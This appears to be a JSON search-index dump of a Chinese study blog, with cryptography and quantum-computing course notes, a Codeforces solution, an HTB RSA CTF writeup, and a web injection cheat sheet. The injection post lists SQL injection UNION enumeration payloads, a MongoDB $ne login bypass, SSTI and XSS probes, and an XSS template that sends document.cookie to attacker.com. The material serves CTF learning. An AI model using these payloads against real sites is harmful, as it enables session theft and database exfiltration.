Game来形式化定义安全性。会有一个Adversary $\\mathcal{A}$，如果他的输出不同于任何”trivial attack”（比如说随机猜测），那么我们就说他破解（break）了我们的加密。我们会用$\\mathcal{A}$’s advantage 来衡量他对我们的加密有多大的影响。 Attack Game 1 (Ciphertext Indistinguishability):For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b \\in \\{0,1\\}$, Experiment $b$ proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes k \\xleftarrow{R} \\mathcal{K},c \\xleftarrow{R} E(k, m_b)and sends $c$ to the adversary.The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$.Let $W_b$ be the event that $\\mathcal{A}$ outputs 1.（$\\mathcal{A}$在实验b的时候输出1） 图示： Definition:We define $\\mathcal{A}$’s ciphertext distinguishing advantage or semantic security advantage asSCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| Definition 9 (Ciphertext Indistinguishability):A cipher $\\Pi := (E, D)$ has (computationally) indistinguishable ciphertexts,if $SC_{adv}[\\mathcal{A}, \\Pi]$ is negligible for all PPT adversaries $\\mathcal{A}$. 如果对于所有adversaries $\\mathcal{A}$都有： SC_{adv}[\\mathcal{A}, \\Pi] = 0那么它一定是(computationally) indistinguishable ciphertexts。 例子： Trivial attacks 如果$\\mathcal{A}$永远输出1，那么 SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |1-1| = 0 如果$\\mathcal{A}$通过扔硬币选择输出，那么 SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |\\frac{1}{2} - \\frac{1}{2}| = 0 如果挑选2条一样的明文，那么advantage也等于0，因为不可能通过任何手段可以判断出来到底加密的是哪条信息，所以只能猜，也就是$|\\frac{1}{2} - \\frac{1}{2}| = 0$。 假如这样设计一个加密：$E(k, m) := (\\text{parity}(m), E’(k, m))$，即加密结果包含2个信息，第一个是明文$m$的奇偶性，第二个是真正的加密内容，那么就会存在一个 adversary with advantage 1： $\\mathcal{A}$挑选2个明文，一个的parity等于1，一个的等于0.那么他就可以通过$E(k, m)$的第一个component的值（parity）来判断明文到底是那条。 对于perfectly secure ciphers，所有的adversary has advantage 0 。 如果我们让challenger随机挑选b，那么就会得到下面这种attack game： Attack Game 2 (Ciphertext Indistinguishability — bit guessing) :For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, the experiment proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes $b \\xleftarrow{R} \\{0,1\\}$, $k \\xleftarrow{R} \\mathcal{K}$, $c \\xleftarrow{R} E(k, m_b)$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W$ be the event that $\\hat{b} = b$ 图示： Definition:We define $\\mathcal{A}$’s bit-guessing advantage as:SCadv^*[\\mathcal{A}, \\Pi] := |\\Pr[W] - \\tfrac{1}{2}| Lemma:SCadv^*[\\mathcal{A}] = \\frac{1}{2}SCadv[\\mathcal{A}] 证明： 因为b是随机挑选的，所以 \\text{Pr}[b = 0] = \\text{Pr}[b = 1] = \\frac{1}{2}那么有 \\begin{align*} \\text{Pr}[W] &= \\text{Pr}[\\hat{b} = b] \\\\ &= \\text{Pr}[\\hat{b} = b \\mid b = 0] \\cdot \\text{Pr}[b = 0] + \\text{Pr}[\\hat{b} = b \\mid b = 1] \\cdot \\text{Pr}[b = 1] \\\\ &= \\frac{1}{2} \\cdot \\left( \\text{Pr}[\\hat{b} = 0 \\mid b = 0] + \\text{Pr}[\\hat{b} = 1 \\mid b = 1] \\right) \\end{align*}根据之前$W_0,W_1$的定义可以得到： \\text{Pr}[\\hat{b} = 0 \\mid b = 0] = 1 - \\text{Pr}[\\hat{b} = 1 \\mid b = 0] = 1 - \\text{Pr}[W_0] \\text{Pr}[\\hat{b} = 1 \\mid b = 1] = \\text{Pr}[W_1]所以： \\begin{align*} SCadv^*[\\mathcal{A}, \\Pi] &= \\left| \\text{Pr}[W] - \\frac{1}{2} \\right| \\\\ &= \\left| \\frac{1}{2} \\cdot (1 - \\text{Pr}[W_0] + \\text{Pr}[W_1]) - \\frac{1}{2} \\right| \\\\ &= \\frac{1}{2} \\cdot \\left| \\text{Pr}[W_1] - \\text{Pr}[W_0] \\right| \\\\ &= \\frac{1}{2} \\cdot SCadv[\\mathcal{A}, \\Pi] \\end{align*}. $\\square$ Theorem 3:The one-time pad （OTP） has indistinguishable ciphertexts. 证明： 我们用bit-guessing game来证明这个thm。 Let $\\mathcal{A}$ be any adversary. Assume it outputs messages $m_0, m_1 \\in \\{0,1\\}^L$ for some length $L$. Since $k$ is randomly chosen, $m_b \\oplus k$ is a uniformly random bitstring of length $L$, independent of $b$. 所以说只能随机猜测b。 所以 SCadv^*[\\mathcal{A}, \\Pi_{\\text{OTP}}] = | \\text{Pr}[W] - \\frac{1}{2} | =| \\text{Pr}[b = \\hat{b}] - \\frac{1}{2} |= 0.$\\square$ Secret key cryptographyDefinition 10 (Pseudo-random generator):A pseudo-random generator (PRG) is an efficiently computable function G : \\mathcal{S} \\to \\mathcal{R}where:$|\\mathcal{S}| &lt; |\\mathcal{R}|$$\\mathcal{S}$ (usually $\\{0,1\\}^l$) is called the seed space.$\\mathcal{R}$ (usually $\\{0,1\\}^L$, $L &gt; l$) is called the output space. 我们可以继续哟个attack game来formalize “random”的概念。 Attack Game 3 (PRG advantage):For a given PRG $G$ defined over $(\\mathcal{S}, \\mathcal{R})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b = 0,1$, Experiment $b$ proceeds as follows:The challenger computes $r \\in \\mathcal{R}$ as follows and sends it to $\\mathcal{A}$:if $b = 0$: $s \\xleftarrow{R} \\mathcal{S},\\ r \\leftarrow G(s)$if $b = 1$: $r \\xleftarrow{R} \\mathcal{R}$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W_b$ be the event that $\\mathcal{A}$ outputs 1 图示： Definition:we define $\\mathcal{A}$’s PRG distinguishing advantage as:PRGadv[\\mathcal{A}, G] := |\\Pr[W_0] - \\Pr[W_1]| Definition 11 (Secure PRG):A PRG $G$ is secure, if $PRGadv[\\mathcal{A}, G]$ is negligible for all PPT adversaries $\\mathcal{A}$. Definition 12 (Stream Cipher Construction):Given a PRG $G : \\mathcal{K} \\to \\{0,1\\}^L$, we define the basic stream cipher $\\Pi = (E, D)$ over$(\\mathcal{K}, \\{0,1\\}^L, \\{0,1\\}^L)$ as follows:$E(k, m) := G(k) \\oplus m$$D(k, c) := G(k) \\oplus c$","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"密码学 Kryptografie","slug":"TUM-info-课程笔记/密码学-Kryptografie","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://archer-baiyi.github.io/en/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"量子计算入门","slug":"TUM info 笔记/量子计算/量子计算入门","date":"2025-04-20T13:40:00.000Z","updated":"2025-04-26T18:31:26.179Z","comments":true,"path":"2025/04/20/TUM info 笔记/量子计算/量子计算入门/","permalink":"https://archer-baiyi.github.io/en/2025/04/20/TUM%20info%20%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E5%85%A5%E9%97%A8/","excerpt":"量子计算入门","text":"Introduction基本概念量子比特（Quantum bits, qubits）普通的比特（bit）只能取两种离散值：0和1。 而量子比特（Quantum bits, qubits）则是处于0和1的叠加态（superposition）：一个量子比特的一般态（quantum state）$|\\psi\\rangle$ 一般写作： |\\psi\\rangle = \\alpha\\,|0\\rangle + \\beta\\,|1\\rangle, \\ \\ \\alpha,\\beta \\in \\mathbb{C}满足 |\\alpha|^2 + |\\beta|^2 = 1 这里的符号 $|\\psi\\rangle$ 叫做 Ket-notation。 我们可以将$|0\\rangle,|1\\rangle$ 当成一个basis，然后将qubit的所有状态看成是一个二维空间的子集，所以我们也可以写成 |\\psi\\rangle = \\begin{pmatrix} \\alpha \\\\ \\beta \\end{pmatrix}当然，在量子比特被观测时，我们只会得到0或者1的结果。其中观测到0的概率为 $|\\alpha|^2$，观测到1的概率为 $|\\beta|^2$。观测行为本身也会改变qubit。如果观测到0，那么qubit会变成 $|\\psi\\rangle = |0\\rangle$，如果观测到1，那么qubit会变成 $|\\psi\\rangle = |1\\rangle$。 需要注意的是我们无法直接观测到一个量子比特的状态，即无法直接测量$\\alpha$和$\\beta$的值。 当然我们还可以用其他方法来表示量子比特： 因为$|\\alpha|^2 + |\\beta|^2 = 1$，所以当$\\alpha$和$\\beta$是实数时，一定存在一个$\\theta\\in \\mathbb{R}$ 使得： \\alpha = cos(\\frac{\\theta}{2}) , \\ \\ \\beta = sin(\\frac{\\theta}{2})推广到复数便可以得到：（因为每个复数都可以写成极坐标的形式： $c = re^{i\\gamma} = |c| \\cdot e^{i\\gamma}$） \\alpha = e^{i\\gamma} cos(\\frac{\\theta}{2}) , \\ \\ \\beta = e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2})因此我们可以将$|\\psi\\rangle$写成： \\begin{align} |\\psi\\rangle &= e^{i\\gamma} cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2}) \\\\ &= e^{i\\gamma}\\Bigl(cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\varphi}sin(\\frac{\\theta}{2})\\Bigl) \\end{align}其中$ \\theta \\in [0, \\pi],\\quad \\varphi, \\gamma \\in [0, 2\\pi)$。 由于$e^{i\\gamma}$对我们来说并不重要（后面会详细讲），所以一个qubit实际上只需要2个实数参数（$\\theta, \\varphi$）。由此每个qubit都对应 Bloch Sphere 的surface上的一个点： r = \\begin{pmatrix} cos(\\varphi)sin(\\theta)\\\\ sin(\\varphi)sin(\\theta)\\\\ cos(\\theta) \\end{pmatrix}Bloch Sphere： 注意，$|0\\rangle$和$|1\\rangle$对应的$\\theta$的值分别为0和$\\pi$，所以他们对应Bloch Sphere的2个极点（poles）。 单量子比特门（Single qubit gate）我们一般用一个complex unitary matrix U来表示qubit的状态变化： |\\psi\\rangle' = U \\cdot |\\psi\\rangle对应的电路图一般这样画： 下面来看一些例子： 以下3个（X,Y,Z）叫做Pauli matrices: Pauli-X gate: X = \\sigma_1 = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix}注意到： X|0\\rangle = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix} \\cdot \\begin{pmatrix} 0 \\\\ 1 \\end{pmatrix}= |1\\rangle X|1\\rangle = |0\\ranglePauli-Y gate: Y = \\sigma_2 = \\begin{pmatrix} 0 & -i \\\\ i & 0 \\end{pmatrix}Pauli-Z gate: Z = \\sigma_3 = \\begin{pmatrix} 1 & 0 \\\\ 0 & -1 \\end{pmatrix}注意到Z不会改变$|0\\rangle$，但是会改变$|1\\rangle$的系数的符号： 假设 \\begin{align} Z \\ |\\psi\\rangle &= cos(\\frac{\\theta}{2}) \\ |0\\rangle - e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\pi}e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\varphi+\\pi)}sin(\\frac{\\theta}{2}) \\end{align}这同样意味着$|\\psi\\rangle $会沿着Z轴旋转$180^\\circ$。 而 Pauli vector 指的则是 $\\sigma = (\\sigma_1,\\sigma_2,\\sigma_3) = (X,Y,Z)$。（a vector of $2\\times 2$ matrices）","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"量子计算 Quantum Computing","slug":"TUM-info-课程笔记/量子计算-Quantum-Computing","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"}],"tags":[{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/en/tags/Quantum-Computing/"},{"name":"量子计算","slug":"量子计算","permalink":"https://archer-baiyi.github.io/en/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"}]},{"title":"AES加解密以及攻击方法","slug":"CTF/Crypto/AES加解密以及攻击方法","date":"2025-04-19T18:00:59.000Z","updated":"2025-04-19T18:12:32.582Z","comments":true,"path":"2025/04/19/CTF/Crypto/AES加解密以及攻击方法/","permalink":"https://archer-baiyi.github.io/en/2025/04/19/CTF/Crypto/AES%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"IntroductionAES-ECBECB的全称为 Electronic Code Book Modus。 攻击明文攻击AES-CBCCBC的全称为 Cipher Block Chaining Modus。 需要一个密钥k以及一个Initialisierungsvektor IV。IV是不需要保密的，很多时候会直接放在密文的开头。 加密： 解密： 攻击Padding OracleAES-CTR这个模式会生成一串密钥流，然后通过与明文进行异或操作进行加密。 一开始需要选择/生成一个随机数Nonce，并初始化计数器（counter/ctr）为0。k为密钥。 加密： 解密：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/en/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/en/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/en/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/en/tags/CTR/"}]},{"title":"Codeforce Raising_Bacteria Task","slug":"算法竞赛/Codeforce/1000/Codeforce-Raising-Bacteria-Task","date":"2025-04-09T06:26:18.000Z","updated":"2025-04-09T06:49:22.141Z","comments":true,"path":"2025/04/09/算法竞赛/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","permalink":"https://archer-baiyi.github.io/en/2025/04/09/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","excerpt":"","text":"题目描述 思路这道题主要考察的是对二进制的理解。 假设我们在第 $i$ 天会放入数量为 $x_i$ 的细菌，那么 $n$ 天之后会得到 $\\sum^n_{i=0}x_i \\cdot 2^i$ 。 所以给定一个数 $x$ ，我们需要找到一组 $[x_0,x_1,…,x_n]$ ，使得 $\\sum^n_{i=0}x_i$ 最小，并且 $\\sum^n_{i=0}x_i \\cdot 2^i = x$ ，即 \\underset{[x_0,x_1,...,x_n]}{\\text{min}}\\sum^n_{i=0}x_i \\quad\\text{s.t.} \\sum^n_{i=0}x_i \\cdot 2^i = x假设 $\\sum^n_{i=0}a_i \\cdot 2^i$ 为 $x$ 的二进制展开。我们现在证明 $[a_0,…,a_n]$ 正是这个最优化问题的解： 首先很显然 $[a_0,…,a_n]$ 满足上面的条件（s.t. 的部分）。假设现在存在 $[b_0,…,b_n]$ 使得 $\\sum^n_{i=0}b_i \\cdot 2^i = x$ 并且 $\\sum^n_{i=0}b_i \\leq \\sum^n_{i=0}a_i$，因为二进制展开永远是唯一的，不难得到 $\\forall i : a_i = b_i$。 所以我们这道题需要做的就是计算 $\\sum^n_{i=0}a_i$，也就是说只需要数 $x$ 的二进制表达里一共有多少个1。 代码C++1234567891011#include &lt;iostream&gt;#include &lt;bitset&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; cout &lt;&lt; __builtin_popcount(x) &lt;&lt; endl; // __builtin_popcount(x) 会返回整数 x 的二进制中 1 的个数。 return 0;&#125; 也可以原始一点： 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; int count = 0; while (x &gt; 0) &#123; if (x % 2 == 1) &#123; count++; &#125; x /= 2; &#125; cout &lt;&lt; count &lt;&lt; endl; return 0;&#125;","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/en/tags/binary/"}]},{"title":"HTB-RSAisEasy-Writeup","slug":"CTF/Crypto/HTB-RSAisEasy-Writeup","date":"2025-04-07T20:51:41.000Z","updated":"2025-04-07T21:26:21.507Z","comments":true,"path":"2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","excerpt":"","text":"题目 附件： 123456789101112131415161718192021222324#!/usr/bin/env python3from Crypto.Util.number import bytes_to_long, getPrimefrom secrets import flag1, flag2from os import urandomflag1 = bytes_to_long(flag1)flag2 = bytes_to_long(flag2)p, q, z = [getPrime(512) for i in range(3)]e = 0x10001n1 = p * qn2 = q * zc1 = pow(flag1, e, n1)c2 = pow(flag2, e, n2)E = bytes_to_long(urandom(69))print(f&#x27;n1: &#123;n1&#125;&#x27;)print(f&#x27;c1: &#123;c1&#125;&#x27;)print(f&#x27;c2: &#123;c2&#125;&#x27;)print(f&#x27;(n1 * E) + n2: &#123;n1 * E + n2&#125;&#x27;) output.txt： 12345n1: 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269c1: 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2: 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673(n1 * E) + n2: 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163 分析我们首先将已知条件列出来： \\begin{align} n1 = p\\cdot q\\\\ n2 = q \\cdot z \\end{align}并且我们有 $n1$ 以及 $n1 \\cdot E + n2$ 的值。我们需要通过这些信息计算出 $p,q,z$ 的值。（因为给的 $n1 \\cdot E + n2$ 不是 $n1$ 的倍数，所以gcd$(p,z)= 1$） 注意到： n1 \\cdot E + n2 = q(p \\cdot E + z)以及 \\text{gcd}(n1, n1 \\cdot E + n2) = \\text{gcd}(p\\cdot q, p \\cdot q \\cdot E + q \\cdot z) = q \\cdot \\text{gcd}(p, p \\cdot E + z) \\overset{\\text{gcd}(p,z)=1}{=} q因为 $p,q,z$ 均为512位的质数，所以它们的取值范围是： 2^{511} \\leq p,q,z \\leq 2^{512}所以z除以q一定是小于等于2的，这意味着： z \\in \\{(z \\text{ mod } p), p + (z \\text{ mod } p)\\}由此，解密的流程为： 先通过计算 $n1$ 和 $n1 \\cdot E + n2$ 的最大公因数得到 $q$ 根据 $n1,q$ 的值得到 $p$ 根据 $n1 \\cdot E + n2, p, q$ 计算 $z$ （通过尝试可以得知z &lt; p，所以 $z = (p \\cdot E + z \\text{ mod } p$ ） 计算d1, d2然后RSA解密。 代码123456789101112131415161718192021222324252627282930from math import gcdfrom Crypto.Util.number import long_to_bytesn1 = 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269# (n1 * E) + n2 = q(p*E + z):n12 = 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163c1= 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2= 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673e = 0x10001q = gcd(n1,n12 %n1)p = n1//qz = (n12//q) % pn2 = q*zd1 = pow(e,-1,(p-1)*(q-1))m1 = pow(c1,d1,n1)flag = long_to_bytes(m1)d2 = pow(e,-1,(z-1)*(q-1))m2 = pow(c2,d2,n2)flag+=long_to_bytes(m2)print(flag)# b&#x27;HTB&#123;1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?&#125;&#x27; 运行得到flag：HTB{1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/en/tags/RSA/"}]},{"title":"代码注入 Injection","slug":"CTF/Web/注入-Injection","date":"2025-04-03T21:24:51.000Z","updated":"2025-12-02T12:40:24.733Z","comments":true,"path":"2025/04/03/CTF/Web/注入-Injection/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/CTF/Web/%E6%B3%A8%E5%85%A5-Injection/","excerpt":"各种注入漏洞及方法","text":"代码注入代码注入攻击（Code Injection）是指攻击者通过将恶意代码注入到目标系统中执行的行为。这些恶意代码可以用于修改、破坏或窃取系统数据，甚至完全控制目标系统。代码注入攻击（Code Injection）利用了系统在处理输入数据时的弱点，经过精心设计的恶意代码会被误以为是合法的指令而被系统执行，从而导致安全漏洞。 以下是常见的注入类型： 注入类型 注入目标 SQL 注入 数据库查询语句 命令注入 操作系统命令 脚本注入 / XSS 网页脚本（JS） 模板注入（SSTI） 服务器模板语法 LDAP 注入 LDAP 查询语句 XML 注入（XXE） XML 实体/结构 基本上所有的代码注入的漏洞都是由于没有对用户的输入进行足够细致的过滤。 SQL Injection漏洞123456db = sqlite3.connect(&quot;:memory:&quot;, isolation_level=None)load_internet(db)cur = db.cursor()cur.execute(&quot;SELECT * FROM internet_index WHERE title LIKE &#x27;%&#123;&#125;%&#x27;&quot;.format(q)) #将未过滤的输入直接拼接进SQL查询语句 注入常用的测试漏洞的Payload： 1234567891011&#x27; OR 1=1 --&#x27; OR 1=1 -- -&#x27; OR 1=1 #&#x27; OR &#x27;1&#x27;=&#x27;1 --&#x27; OR 1=1; #&#x27; OR username=&#x27;admin&#x27; -- （在 MariaDB / MySQL 中，# 是单行注释符，而不是--。） 确认漏洞确实存在并且确定了具体注入格式了之后便可以开始后续的步骤。 而读取其他表格前我们需要先确定当前表格的字段数（一共有多少列），可以通过Union来尝试： 12345&#x27; UNION SELECT 1 -- &#x27; UNION SELECT 1,2 -- &#x27; UNION SELECT 1,2,3 -- &#x27; UNION SELECT 1,2,3,4 -- ... 失败的情况一般会返回类似于 Error: The used SELECT statements have a different number of columns 的报错。（或者就干脆什么都不显示，抑或是提示失败。）这个方法同时可以确定当前正常情况的返回结果为当前表格的哪个字段。 确定字段数（表格的列数）了之后便可以： 1. 确认所有表格名称： 1&#x27; UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema=database() -- null的数量以及table_name的位置取决于当前表格的字段数（一共有多少列）以及返回结果具体为哪个字段（列）。 假设当前表格叫做为logins。 2. 确认某个表格的所有列名（字段名）： 123&#x27; UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR &#x27;, &#x27;), null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- 如果不成功则可以一列一列确定： 123456789&#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 0,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 1,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 2,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 3,1 -- ... 3. 确认某个表格所有列的内容： 假设现在有4列内容，为a,b,c,d，则直接用Union即可： 1&#x27; UNION a, b, c, d FROM logins -- 如果失败则也可以一项一项确定某一列的内容： 123456&#x27; UNION SELECT null, username, null, null FROM logins LIMIT 0,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 1,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 2,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 3,1 -- ... MangoDB： 1234&#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125; 模板注入 Server-Side Template Injection（SSTI）服务器端模板注入（Server-side Template Injection，简称SSTI）是指攻击者能够利用模板引擎的原生语法，将恶意代码注入到模板中，而该模板随后会在服务器端被执行。 模板引擎的作用是通过将固定的模板与动态数据结合，来生成网页。当用户输入被直接拼接到模板中（而不是作为数据安全地传入）时，就可能发生服务器端模板注入攻击。这样一来，攻击者可以注入任意的模板指令，从而操控模板引擎，往往最终能完全控制服务器。 Jinja2漏洞： 1&lt;p class=&quot;nes-text is-primary warrior-name&quot;&gt;&#123;warrior_name&#125;&lt;/p&gt; （大括号里的内容为未过滤的输入） 注入： 1&#123;&#123; 7*7 &#125;&#125; Mako漏洞： 12345678from mako.template import Templatedef generate_render(converted_fonts): result = &#x27;&#x27;&#x27; &lt;tr&gt;&lt;td&gt;&#123;3&#125;&lt;/td&gt;&lt;/tr&gt; &#x27;&#x27;&#x27;.format(*converted_fonts) return Template(result).render() （大括号里的内容为未过滤的输入） 注入： 1$&#123;7*7&#125; PugXSS漏洞1&lt;p&gt;You requested help in the &#123;&#123;ln|safe&#125;&#125; language!&lt;/p&gt; |safe 会直接放行我们的任意输入。 注入测试Payload： 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt; 普通的xss攻击模板： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 可以在 https://requestbin.kanbanbox.com/ 创建一个临时的RequestBin。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"}]},{"title":"GBS 2 Prozess- und Prozessorverwaltung 进程与处理器管理","slug":"TUM info 笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理","date":"2025-04-03T21:21:10.000Z","updated":"2025-04-26T18:30:46.287Z","comments":true,"path":"2025/04/03/TUM info 